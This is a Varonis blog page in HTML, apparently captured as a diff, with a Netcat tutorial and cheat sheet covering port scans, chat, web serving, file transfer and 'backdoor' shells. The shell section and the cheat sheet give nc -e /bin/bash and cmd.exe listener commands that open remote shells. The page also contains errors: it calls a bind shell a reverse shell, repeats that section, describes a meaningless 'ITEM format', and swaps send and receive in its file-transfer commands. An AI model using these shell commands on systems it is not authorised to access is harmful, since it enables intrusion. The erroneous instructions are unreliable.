+					<div class="hero inner-hero c-white " style="background:url(https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/images/bg/blog-hero-bg.png) center center no-repeat; background-size:cover;">
+	<div class="pcenter">
+	
+			<div class="hero-content ta-center">
+			
+					<h1 class="hero-title">How to Use Netcat Commands: Examples and Cheat Sheets</h1>
+					<p class="category-list"><a href="https://www.varonis.com/blog/category/it_pros/" rel="category tag">IT Pros</a></p>
+															</div>
+			
+			
+	</div>
+	</div>
+
+    
+    
+        <main id="main" class="site-main" role="main">
+				
+    <div class="pcenter">
+
+	<p id="breadcrumbs"><span><span><a href="https://www.varonis.com/blog/" >Inside Out Security Blog</a> » <span><a href="https://www.varonis.com/blog/category/it_pros/" >IT Pros</a> » <span class="breadcrumb_last" aria-current="page">How to Use Netcat Commands: Examples and Cheat Sheets</span></span></span></span></p>
+        <div class="g-anchor-nav ta-center"></div><div class="glossary-list"></div>        
+        
+<article id="post-12994" class="post-12994 post type-post status-publish format-standard has-post-thumbnail hentry category-it_pros tag-infosec">
+
+	<div class="entry-content">
+		<div class='single-thumbnail' style='background-image:url(https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero-1200x401.png);'><img width="1240" height="414" src="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero.png" class="attachment-full size-full wp-post-image" alt="Netcat image of a network" srcset="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero.png 1240w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero-300x100.png 300w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero-768x256.png 768w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero-1024x342.png 1024w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero-1200x401.png 1200w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" /></div>		<div class="author-area byline">
+			<p class="author-name">By </p><img src="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/03/jeff-petters-200x200-150x150.jpg" width="30" height="30" alt="Jeff Petters" class="avatar avatar-30 wp-user-avatar wp-user-avatar-30 alignnone photo" /><p class="author-name co-author-number-1"><a href="https://www.varonis.com/blog/author/jpetters/">Jeff Petters</a></p>	
+
+			<p class="last-update">Updated: <time class="last-updated" id="last-updated" datetime="2020-03-29T18:09:55-04:00" itemprop="dateModified">3/29/2020</time></p>
+			
+			<!--BEGIN .share-bar-->
+			<div class="share-bar" data-url="https://www.varonis.com/blog/netcat-commands/" data-media="" data-description="How to Use Netcat Commands: Examples and Cheat Sheets">
+				<span class="share-links">
+					<a href="https://twitter.com/intent/tweet?text=How to Use Netcat Commands: Examples and Cheat Sheets&amp;url=https://www.varonis.com/blog/netcat-commands/&amp;via=varonis" class="share-link fa fa-twitter" target="_blank"></a>
+					<a href="http://www.facebook.com/sharer.php?u=https://www.varonis.com/blog/netcat-commands/" class="share-link fa fa-facebook" target="_blank"></a>
+					<a href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.varonis.com/blog/netcat-commands/" class="share-link fa fa-linkedin" target="_blank"></a>
+				</span>
+				<a class="fa fa-envelope-o share-link" href="mailto:?subject=How to Use Netcat Commands: Examples and Cheat Sheets&body=https://www.varonis.com/blog/netcat-commands/"></a>
+				<!--END .share-bar-->
+			</div>				
+		</div>
+
+<div class="post-content">
+				<p>The Netcat utility program supports a wide range of commands to manage networks and monitor the flow of traffic data between systems. Computer networks, including the world wide web, are built on the backbone of the <a href="https://www.howtogeek.com/190014/htg-explains-what-is-the-difference-between-tcp-and-udp/" target="_blank" rel="noopener noreferrer">Transmission Control Protocol (TCP) and User Datagram Protocol (UDP)</a>. <span style="font-weight: 400;"> Think of it as a free and easy companion tool to use alongside </span><a href="https://www.varonis.com/blog/how-to-use-wireshark/" target="_blank" rel="noopener noreferrer">Wireshark</a>,<span style="font-weight: 400;"> which specializes in the analysis of network packets. The original version of Netcat was released back in 1995 and has received a number of iterative updates in the decades since.</span></p>
+<ul>
+<li><a href="#commands">Netcat Commands</a>
+<ul>
+<li><a href="#port">Port Scanning with Netcat Commands</a></li>
+<li><a href="#chat">Create a Chat or Web Server</a></li>
+<li><a href="#verbose">Verbose Scan with Netcat Commands</a></li>
+<li><a href="#http">HTTP Requests with Netcat Commands</a></li>
+<li><a href="#tcp">TCP Server and TCP Client Commands</a></li>
+<li><a href="#item">ITEM with NetCat Commands</a></li>
+<li><a href="#prevent">Prevent DNS Lookup with Netcat Commands</a></li>
+</ul>
+</li>
+<li><a href="#scripting">Scripting with Netcat</a></li>
+<li><a href="#shell">Shell Scripting with Netcat</a></li>
+<li><a href="#backdoor">Launching Reverse (Backdoor) Shells</a></li>
+<li><a href="#cheat-sheet">Printable Netcat Cheat Sheet</a></li>
+<li><a href="#resources">Additional Netcat Resources</a></li>
+</ul>
+<h2>What is Netcat Used For?</h2>
+<p>Netcat can be a useful tool for any IT team, though the growth of internally managed network services and cloud computing make that particular environment a natural fit. <a href="https://www.varonis.com/blog/21-free-tools-every-sysadmin-know/" target="_blank" rel="noopener noreferrer">Network and system administrators</a> need to be able to quickly identify how their network is performing and what type of activity is occurring.</p><div class='code-block code-block-1' style='margin: 8px auto; text-align: center; display: block; clear: both;'>
+<style>
+.cta-block{
+  margin-top: 45px;
+  margin-bottom: 45px;
+  padding-top: 45px;
+  padding-bottom: 45px;
+  padding-left: 48px;
+  padding-right: 48px;
+  background-color: #F7F8FC;
+  color: #fff;
+  text-align: center;
+}
+
+.cta-block h3{
+  text-align: center;
+  color: #212234
+}
+
+
+.hubspot-forms-container{
+  padding: 20px;
+  margin-right: auto;
+  margin-left: auto;
+
+}
+
+
+.cta-testimonial{
+  font-size: 20px;
+  font-style: italic;
+  color: #55585B
+}
+
+</style>
+
+
+<div class='cta-block'>
+
+    <h3>Get the Free Pen Testing Active Directory Environments EBook</h3>
+
+    <div class='hubspot-forms-container'>
+<script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2.js"></script>
+<script>
+
+window['Bizible'] = window['Bizible'] || { _queue: [], Push: function (o, p) {this._queue.push({ type: o, data: p }); } };
+
+  hbspt.forms.create({
+	portalId: "142972",
+	formId: "40a8f297-80c2-4c34-9572-8648458abed5",
+	sfdcCampaignId: "70158000000otJGAAY",
+        onFormSubmit: function($form){
+          
+          Bizible.Push('User', {
+            eMail: $form.find('[name=email]').val()
+          });
+
+        }
+
+});
+</script>
+
+    </div>
+
+   <div class='cta-testimonial'>
+    “This really opened my eyes to AD security in a way defensive work never did.”
+   </div>
+
+</div></div>
+
+<p>Netcat functions as a back-end tool that allows for port scanning and port listening. In addition, you can actually transfer files directly through Netcat or use it as a backdoor into other networked systems. Partnered with a tool like <a href="https://www.varonis.com/products/edge" target="_blank" rel="noopener noreferrer">Varonis Edge</a>, you would receive an alert of any unusual activity and could then use Netcat to investigate. Lastly, Netcat is a flexible tool because of how it can be scripted for larger tasks.</p>
+<p><img class="nolink aligncenter size-full wp-image-13001" src="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-uses.png" alt="Netcat command uses" width="960" height="540" srcset="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-uses.png 960w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-uses-300x169.png 300w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-uses-768x432.png 768w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" /></p>
+<h2 id="commands">Basic Netcat Commands</h2>
+<p>Once you have a Netcat application set up on your Windows or Linux server, you can start running basic commands to test its functionality. Here are a few to get started with:</p>
+<p><b>nc -help</b> – This command will print a list of all of the available commands you can use in Netcat. It will come in handy if you run into any errors while writing a script or are unsure of how to proceed.</p>
+<p><b>nc -z -v site.com</b> – This will run a basic <a href="https://www.varonis.com/blog/port-scanning-techniques/" target="_blank" rel="noopener noreferrer"><span style="font-weight: 400;">port scan</span></a><span style="font-weight: 400;"> of the specified website or server. Netcat will return verbose results with lists of ports and statuses. Keep in mind that you can use an IP address in place of the site domain.</span></p>
+<p><b>nc -l</b> – This command will instruct the local system to begin listening for TCP connections and UDP activity on a specific port number.</p>
+<p><b>nc site.com 1234 (less than) file_name</b> – This command will initiate the transfer of a file based on the specified port number.</p>
+<p><b>Printf</b> – Netcat can actually operate as a simplified web host. This command will let you save HTML code and publish it through your local server.</p>
+<p><a href="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-printf-1.png" target="_blank" rel="noopener noreferrer"><img class="nolink aligncenter size-full wp-image-13000" src="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-printf-1.png" alt="netcat command screenshot of the printf command" width="960" height="620" srcset="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-printf-1.png 960w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-printf-1-300x194.png 300w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-printf-1-768x496.png 768w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" /></a></p>
+<h3 id="syntax">Netcat Command Syntax</h3>
+<p><span style="font-weight: 400;">All Netcat commands must start with the &#8220;netcat&#8221; identifier or &#8220;nc&#8221; as a shorter option. By default, the Netcat tool will assume you want to perform a port scan unless you indicate otherwise. </span></p>
+<p><span style="font-weight: 400;">Different option parameters can be used that include: &#8220;-u&#8221; for UDP traffic instead of TCP, &#8220;-v&#8221; for verbose output, &#8220;-p&#8221; to specify a specific port, and &#8220;-D&#8221; to turn on full debugging mode. Individual attributes within a Netcat command must be separated with a space. The command prompt will inform you if you have a typo or unrecognized term in your script.</span></p>
+<h2 id="port">Port Scanning with Netcat Commands</h2>
+<p>When trying to diagnose a network issue or performance problem, executing a port scan with Netcat is a smart first step to take. The scan will check the status of all ports on the given domain or IP address so that you can determine whether a firewall or other blocking mechanism is in place.</p>
+<p>A basic port scan command for an IP ncat address looks like this:</p>
+<p><strong>nc -v -n 8.8.8.8 1-1000</strong></p>
+<p><a href="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-port-scan-2.png" target="_blank" rel="noopener noreferrer"><img class="nolink aligncenter size-full wp-image-12999" src="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-port-scan-2.png" alt="netcat command screenshot of the port scan" width="960" height="540" srcset="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-port-scan-2.png 960w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-port-scan-2-300x169.png 300w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-port-scan-2-768x432.png 768w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" /></a></p>
+<p>Note that the numbers at the end of the command tell Netcat to only scan for ports between numbers 1 and 1000.</p>
+<p>If you don&#8217;t know the IP address of a server or website, then you can look it up via a ping terminal command or just insert the domain into the Netcat command:</p>
+<p><strong>nc -v -n google.com 1-1000</strong></p>
+<p>You should always perform port scans when connected to your local enterprise network. If not, you can configure your router with a VPN service to create a secure tunnel into the network.</p>
+<h2 id="chat">Create a Chat or Web Server</h2>
+<p>Chat programs are on the rise. From <a href="https://www.univention.com/blog-en/2019/06/rocket-chat-and-ucs-open-source-data-privacy-minded-and-loving-it/" target="_blank" rel="noopener noreferrer">open-source solutions</a> to those that seemed to <a href="https://searchunifiedcommunications.techtarget.com/news/252456752/Number-of-daily-Slack-users-surpasses-10-million" target="_blank" rel="noopener noreferrer">suddenly gain massive popularity</a>, there are a wide range of chat and communication tools available to enterprise organizations. The reality is that some IT experts and system administrators would prefer a simple text-only solution. <a href="https://nmap.org/ncat/guide/ncat-chat.html" target="_blank" rel="noopener noreferrer">Windows Netcat</a> can actually fill that need and allow for the transmission of messages across a local network.</p>
+<p>To get started, you first need Netcat to start listening on a port number. Make sure not to choose a port that is already in use by another application or service.</p>
+<p><strong>nc -l -p 1299</strong></p>
+<p><a href="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-chat-3.png" target="_blank" rel="noopener noreferrer"><img class="nolink aligncenter size-full wp-image-12998" src="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-chat-3.png" alt="netcat command screenshot of the chat command" width="960" height="390" srcset="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-chat-3.png 960w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-chat-3-300x122.png 300w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-chat-3-768x312.png 768w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" /></a></p>
+<p><span style="font-weight: 400;">Then all you need to do is launch the chat session with a new TCP connection:</span></p>
+<p><strong>nc localhost 1299</strong></p>
+<p>This process can also be used to spin up a basic web server from your local machine. Netcat will function as the web host and allow you to store HTML content which can then be viewed through a web browser.</p>
+<p>First, create a new text document on your local system and make sure to use valid HTML tags. Then save the file as &#8220;index.html&#8221; and store it in the root of your Netcat directory. Now switch back to the Netcat tool and run this command:</p>
+<p><strong>printf &#8216;HTTP/1.1 200 OK\n\n%s&#8217; &#8220;$(cat index.html)&#8221; | netcat -l 8999</strong></p>
+<p>To see the HTML in action, simply open any web browser and navigate to your local IP address with: 8999 at the end to specify the port of the host.</p>
+<h2 id="verbose">Verbose Scan with Netcat Commands</h2>
+<p>Every command you run in Netcat will include certain output text to indicate whether it was successful or not. For troubleshooting and debugging purposes, you&#8217;ll want to gather as much information and logs as possible while also investing in solutions like <a href="https://www.varonis.com/products/datalert/" target="_blank" rel="noopener noreferrer">Varonis Datalert</a> to detect threats and respond quickly. Netcat can help thanks to the verbose parameter which can be added to any basic Netcat command. Simply include &#8220;-v&#8221; to your command and run it again.</p>
+<p>Even with this setting turned on, Netcat will not reveal any of your <a href="https://www.varonis.com/blog/what-is-mimikatz/" target="_blank" rel="noopener noreferrer">credentials or authentication data</a>.</p>
+<h2 id="http">HTTP Requests with Netcat Commands</h2>
+<p>We&#8217;ve covered how you can use Netcat to host HTML pages on your local system. But the utility program can also be used to make web requests to outside servers. In this way, Netcat will essentially function as a web browser by obtaining raw HTML code.</p>
+<p>Along with a tool like <a href="https://www.varonis.com/products/edge/" target="_blank" rel="noopener noreferrer">Varonis Edge</a>, Netcat can be helpful for IT professionals who are looking into internet traffic issues or proxies. Here&#8217;s an example of how to obtain the HTML content from Google&#8217;s homepage:</p>
+<p><strong>printf &#8220;GET / HTTP/1.0\r\n\r\n&#8221; | nc google.com 80</strong></p>
+<p>Note that the port number 80 is required for this type of command since the world wide web uses it as a default for TCP over IP connections.</p>
+<h2 id="tcp">TCP Server and TCP Client Commands</h2>
+<p>Although the TCP protocol is primarily used for transferring web traffic around the world, it can actually be implemented at a local level for file transfers. To accomplish this, you need to run Netcat from two locations: one that will act as a server to send the file and one that will act as the client to receive it.</p>
+<p>Run this Netcat command on the server instance to send the file over port 1499:</p>
+<p><strong>nc -l 1499 &gt; filename.out</strong></p>
+<p>Then run this command on the client to accept, receive, and close the connection:</p>
+<p><strong>nc server.com 1499 (less than) filename.in</strong></p>
+<p>Make sure to replace &#8220;server.com&#8221; with the full hostname or IP address of the sending server.</p>
+<h2 id="item">ITEM with Netcat Commands</h2>
+<p>Newer versions of Netcat allow you to use ITEM format for transferring data instead of the standard TCP or UDP protocols. To accomplish this, you must follow this syntax:</p>
+<p><strong>file_path (pipe) device_path (pipe) network host</strong></p>
+<h2 id="prevent">Prevent DNS Lookup with Netcat Commands</h2>
+<p>Netcat commands run fastest when they are operating purely on IP addresses. This because no time is wasted talking to domain name servers (DNS) to translate server names into IP addresses. If you find that your Netcat commands are still running slow, make sure to add the &#8220;-n&#8221; operator so that the utility knows that DNS lookups are not required.</p>
+<h2 id="shell">Shell Scripting with Netcat</h2>
+<p>As mentioned earlier, one of the benefits of using Netcat is that it can be included as part of a larger script that performs an automated function. As part of your security procedures, you might want to run a full port scan on all of your servers to detect new malicious applications that are listening for a connection.</p>
+<p>You could write a script that:</p>
+<p>1. Imports a text file of server names or IP addresses<br />
+2. Calls Netcat to run a port scan on each server<br />
+3. Writes the output to a new text file for analysis</p>
+<p>Multiple Netcat commands can be grouped together in a single script and be run through either a Linux or Windows shell. In some cases, it may be worthwhile to have the scripts on a regular timetable.</p>
+<h2 id="backdoor">Launching Reverse (Backdoor) Shells</h2>
+<p>To get started, you need to enable the shell tool over a Netcat command by using Netcat reverse shell:</p>
+<p><strong>nc -n -v -l -p 5555 -e /bin/bash</strong></p>
+<p>Then from any other system on the network, you can test how to run commands on host after successful <a href="https://www.varonis.com/blog/the-difference-between-bash-and-powershell/" target="_blank" rel="noopener noreferrer">Netcat connection in bash</a>.</p>
+<p><strong>nc -nv 127.0.0.1 5555</strong></p>
+<p>A reverse shell is a remote access approach where you run administrative commands from one terminal while connecting to another server on the network. To get started, you need to enable the shell tool over a Netcat command by using Netcat reverse shell:</p>
+<p><strong>nc -n -v -l -p 5555 -e /bin/bash</strong></p>
+<p>Then from any other system on the network, you can test how to run commands on the selected host after successful Netcat connection in bash:</p>
+<p><strong>nc -nv 127.0.0.1 5555</strong></p>
+<h2 id="cheat-sheet">Netcat Cheat Sheet</h2>
+<p>Until you start using Netcat on a regular basis, you might get confused about the command syntax or forget what some of the parameters do. Don&#8217;t worry! We&#8217;ve included a cheat sheet below to help you find what you need quickly to run a working Netcat command.</p>
+<p><a href="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/netcat-commands-cheat-sheet.pdf" target="_blank" rel="noopener noreferrer"><img class="nolink aligncenter size-full wp-image-12997" src="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/download-netcat-command-cheet-sheet.png" alt="download cheat sheet button" width="1200" height="226" srcset="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/download-netcat-command-cheet-sheet.png 1200w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/download-netcat-command-cheet-sheet-300x57.png 300w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/download-netcat-command-cheet-sheet-768x145.png 768w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/download-netcat-command-cheet-sheet-1024x193.png 1024w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" /></a></p>
+<h3>Netcat Fundamentals</h3>
+<p><strong>nc [options] [host] [port]</strong> – by default this will execute a port scan</p>
+<p><strong>nc -l [host] [port]</strong> – initiates a listener on the given port</p>
+<h3>Netcat Command Flags</h3>
+<p><strong>nc -4</strong> – use IPv4 only</p>
+<p><strong>nc -6</strong> – use IPv6</p>
+<p><strong>nc -u</strong> – use UDP instead of TCP</p>
+<p><strong>nc -k -l</strong> – continue listening after disconnection</p>
+<p><strong>nc -n</strong> – skip DNS lookups</p>
+<p><strong>nc -v</strong> – provide verbose output</p>
+<h3>Netcat Relays on Windows</h3>
+<p><strong>nc [host] [port] &gt; relay.bat</strong> – open a relay connection</p>
+<p><strong>nc -l -p [port] -e relay.bat</strong> – connect to relay</p>
+<h3>Netcat Relays on Linux</h3>
+<p><strong>nc -l -p [port] 0 (less than) backpipe (pipe) nc [client IP] [port] (pipe) tee backpipe</strong></p>
+<h3>Netcat File Transfer</h3>
+<p><strong>nc [host] [port] (greater than) file_name.out</strong>– send a file</p>
+<p><strong>nc [host] [port] (less than) file_name.in</strong> – receive a file</p>
+<h3>Netcat Port Scanner</h3>
+<p><strong>nc -zv site.com 80</strong> – scan a single port</p>
+<p><strong>nc -zv hostname.com 80 84</strong> – scan a set of individual ports</p>
+<p><strong>nc -zv site.com 80-84</strong> – scan a range of ports</p>
+<h3>Netcat Banners</h3>
+<p><strong>echo &#8220;&#8221; | nc -zv -wl [host] [port range]</strong> – obtain the TCP banners for a range of ports</p>
+<h3>Netcat Backdoor Shells</h3>
+<p><strong>nc -l -p [port] -e /bin/bash</strong> – run a shell on Linux</p>
+<p><strong>nc -l -p [port] -e cmd.exe</strong> – run a shell on <a href="https://www.varonis.com/blog/how-to-use-powershell-objects-and-data-piping/" target="_blank" rel="noopener noreferrer">Netcat for Windows</a></p>
+<h2 id="resources">Additional Netcat Resources</h2>
+<ul>
+<li><a href="https://www.linode.com/docs/networking/diagnostics/netcat/netcat/" target="_blank" rel="noopener noreferrer">The Full Potential of Netcat</a></li>
+<li><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/networking_guide/sec-managing_data_using_the_ncat_utility" target="_blank" rel="noopener noreferrer">Using Netcat with RedHat</a></li>
+<li><a href="https://www.youtube.com/watch?v=Dbz8wQLz2Sw" target="_blank" rel="noopener noreferrer">Introduction to Netcat on Youtube</a></li>
+<li><a href="https://resources.infosecinstitute.com/netcat-uses/#gref" target="_blank" rel="noopener noreferrer">Netcat for Security</a></li>
+<li><a href="https://www.instructables.com/id/More-Fun-with-netcat/" target="_blank" rel="noopener noreferrer">Fun lessons with Netcat</a></li>
+</ul>
+<p>In today&#8217;s fast-changing world of technology and <a href="https://www.networkcomputing.com/network-security/problem-complex-networks-getting-harder-secure" target="_blank" rel="noopener noreferrer">increasingly complex networks</a>, companies need to be proactive when it comes to cybersecurity. That means <a href="https://www.varonis.com/blog/cybersecurity-careers/" target="_blank" rel="noopener noreferrer">hiring experts</a> who know what threats to look for and how to combat them. Otherwise, a single instance of a <a href="https://www.varonis.com/solutions/ransomware/" target="_blank" rel="noopener noreferrer">cyberattack</a> like ransomware could lead to lasting damage for the entire organization. Pairing solutions from Varonis with tools like Netcat will help to keep your internal network safer.</p>
+</div>
+	
+<div class="author-area bottom"><img src="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/03/jeff-petters-200x200-150x150.jpg" width="80" height="80" alt="Jeff Petters" class="avatar avatar-80 wp-user-avatar wp-user-avatar-80 alignnone photo" /><div class="right-col"><p class="author-name">Jeff Petters</p><p class="author-description">Jeff has been working on computers since his Dad brought home an IBM PC 8086 with dual disk drives. Researching and writing about data security is his dream job.</p></div><div>
+			</div><!-- .entry-content -->
+
+	
+</article><!-- #post-## -->
+<aside>
+
+	<aside id="secondary" class="sidebar widget-area" role="complementary">
+		<section id="media_image-2" class="widget widget_media_image"><a href="https://www.varonis.com/cyber-workshop/" target="_blank" rel="noopener noreferrer"><img width="300" height="685" src="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/03/varonis-cyber-attack-workshop.png" class="image wp-image-12105  attachment-full size-full" alt="" style="max-width: 100%; height: auto;" srcset="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/03/varonis-cyber-attack-workshop.png 300w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/03/varonis-cyber-attack-workshop-131x300.png 131w" sizes="(max-width: 300px) 85vw, 300px" /></a></section><section id="media_image-3" class="widget widget_media_image"><a href="https://info.varonis.com/course/cyber-incident-response" target="_blank" rel="noopener noreferrer"><img width="300" height="653" src="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/03/varonis-ad03.png" class="image wp-image-12104  attachment-full size-full" alt="Cyber Incident Response Video Course" style="max-width: 100%; height: auto;" srcset="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/03/varonis-ad03.png 300w, https://blogvaronis2.wpengine.com/wp-content/uploads/2019/03/varonis-ad03-138x300.png 138w" sizes="(max-width: 300px) 85vw, 300px" /></a></section>
+			
+		
+					
+
+	</aside><!-- .sidebar .widget-area -->
+
+</aside>    
+    </div>
+    <a id="anchor-up" class="anchor-up bg-dark" href="#main"><i class="fa fa-chevron-up c-white"></i></a>
+
+		<!--BEGIN .share-bar-->
+		<div class="share-bar" style="opacity: 0;" data-url="https://www.varonis.com/blog/netcat-commands/" data-media="" data-description="How to Use Netcat Commands: Examples and Cheat Sheets">
+			<span class="share-links">
+				<a href="https://twitter.com/intent/tweet?text=How to Use Netcat Commands: Examples and Cheat Sheets&amp;url=https://www.varonis.com/blog/netcat-commands/&amp;via=varonis" class="share-link fa fa-twitter" target="_blank"></a>
+				<a href="http://www.facebook.com/sharer.php?u=https://www.varonis.com/blog/netcat-commands/" class="share-link fa fa-facebook" target="_blank"></a>
+				<a href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.varonis.com/blog/netcat-commands/" class="share-link fa fa-linkedin" target="_blank"></a>
+			</span>
+			<a class="fa fa-envelope-o share-link" href="mailto:?subject=How to Use Netcat Commands: Examples and Cheat Sheets&body=https://www.varonis.com/blog/netcat-commands/"></a>
+			<!--END .share-bar-->
+		</div>		
+    </main><!-- .site-main -->
+    
+    
+     
+        
+
+
+
+					<div class="bottom-cta-wrap-outer">		
+				<div class="bottom-cta-wrap">
+					<section id="custom_html-13" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a href="https://info.varonis.com/course/gdpr-attack-plan" target="_blank" rel="noopener noreferrer"><div class="cta-2019 wide cta-2019-gpdr" style="background-image: url(https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/images/cta/gpdr-background.jpg)"><div class="cta-img"></div><div class="cta-left"><p class="cta-credits">1 CPE Credit</p><h2 class="cta-title">Free Video Course</h2><p class="cta-subtitle">GDPR Attack Plan</p></div><div class="cta-right"><p class="cta-btn">Start Now</p></div><div class="cta-btn-wrap"></div></div></a></div></section>				</div>			
+				<div class="bottom-cta-grey-bg to-right"></div>				
+			</div>			
+			
+	  <!-- BLOG POSTS GRID -->
+	<div class="related-gray">
+	  <section id="related-posts-header" class="pcenter">
+    	<p><span>———</span> RELATED POSTS <span>———</span></p>
+	  </section>
+  <section id="related-posts" class="pcenter">
+    <!-- Related Posts -->
+    		<div rel="article" class="related-post-card">
+			<a href="https://www.varonis.com/blog/sans-top-20/" class="post-card-content">
+			<div class="post-image" style="background:url(https://blogvaronis2.wpengine.com/wp-content/uploads/2020/04/SANS_Top_20_Critical_Controls_to_Know_Hero.png) center center no-repeat; background-size:cover;"></div>
+			  <p class="post-category"><a href="https://www.varonis.com/blog/category/it_pros/" rel="category tag">IT Pros</a></p>
+			  <p class="post-title"><a href="https://www.varonis.com/blog/sans-top-20/">SANS Top 20 Critical Controls to Know</a></p>
+			</a>
+		</div>
+	  			<div rel="article" class="related-post-card">
+			<a href="https://www.varonis.com/blog/malware-protection/" class="post-card-content">
+			<div class="post-image" style="background:url(https://blogvaronis2.wpengine.com/wp-content/uploads/2020/04/Malware_Protection_Basics_and_Best_Practices_Hero.png) center center no-repeat; background-size:cover;"></div>
+			  <p class="post-category"><a href="https://www.varonis.com/blog/category/data_security/" rel="category tag">Data Security</a>, <a href="https://www.varonis.com/blog/category/it_pros/" rel="category tag">IT Pros</a>, <a href="https://www.varonis.com/blog/category/threat_detection/" rel="category tag">Threat Detection</a></p>
+			  <p class="post-title"><a href="https://www.varonis.com/blog/malware-protection/">Malware Protection: Basics and Best Practices</a></p>
+			</a>
+		</div>
+	  			<div rel="article" class="related-post-card">
+			<a href="https://www.varonis.com/blog/sysmon-threat-detection-guide/" class="post-card-content">
+			<div class="post-image" style="background:url(https://blogvaronis2.wpengine.com/wp-content/uploads/2020/01/sysmon-hero.png) center center no-repeat; background-size:cover;"></div>
+			  <p class="post-category"><a href="https://www.varonis.com/blog/category/it_pros/" rel="category tag">IT Pros</a>, <a href="https://www.varonis.com/blog/category/threat_detection/" rel="category tag">Threat Detection</a></p>
+			  <p class="post-title"><a href="https://www.varonis.com/blog/sysmon-threat-detection-guide/">Sysmon Threat Analysis Guide</a></p>
+			</a>
+		</div>
+	  			<div rel="article" class="related-post-card">
+			<a href="https://www.varonis.com/blog/guide-no-hassle-eql-threat-hunting/" class="post-card-content">
+			<div class="post-image" style="background:url(https://blogvaronis2.wpengine.com/wp-content/uploads/2020/03/black-and-white-photo-of-a-diving-man-2111861.jpg) center center no-repeat; background-size:cover;"></div>
+			  <p class="post-category"><a href="https://www.varonis.com/blog/category/data_security/" rel="category tag">Data Security</a>, <a href="https://www.varonis.com/blog/category/it_pros/" rel="category tag">IT Pros</a></p>
+			  <p class="post-title"><a href="https://www.varonis.com/blog/guide-no-hassle-eql-threat-hunting/">The No Hassle Guide to Event Query Language (EQL) for Threat Hunting</a></p>
+			</a>
+		</div>
+	  	  </section>
+</div>
+	
+</div><!-- .content-area -->
+
+
+
+<script>
+( function($){
+
+$(document).ready(function() {
+	  
+});
+
+$(function() {
+  $('a[href*=#]:not([href=#])').click(function(){
+	if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'') && location.hostname == this.hostname) {
+	  var target = $(this.hash);
+	  target = target.length ? target : $('[name=' + this.hash.slice(1) +']');
+	  
+	  
+	  if (target.length) {
+		  var scrollOffset = target.offset().top;
+		  /*
+		  if (navigator.userAgent.match(/iPad|iPhone|iPod|Android|Windows Phone/i)) { 
+				$('html').animate({ scrollTop: $("body").offset().top }, 1000);
+								  
+		  }else{
+			$('html,body').animate({ scrollTop: scrollOffset }, 1000);
+			return false;
+		  }
+		  */
+		  
+		  
+		  $('html,body').animate({ scrollTop: scrollOffset }, 1000);
+		  return false;
+	  
+		
+	  }
+	  
+	}
+  });
+});
+
+$(window).scroll(function(e) {
+	var topOfWindow = $(window).scrollTop();
+    var mainOffset = $('#main').offset().top + 300;
+	
+	console.log( mainOffset );
+	if( mainOffset < topOfWindow){
+		$('#anchor-up').addClass('active');
+	}else{
+		$('#anchor-up').removeClass('active');
+	}
+});
+
+})(jQuery);
+</script>
+
+
+<section class="section sybersecurity ta-right c-white hs-bg">
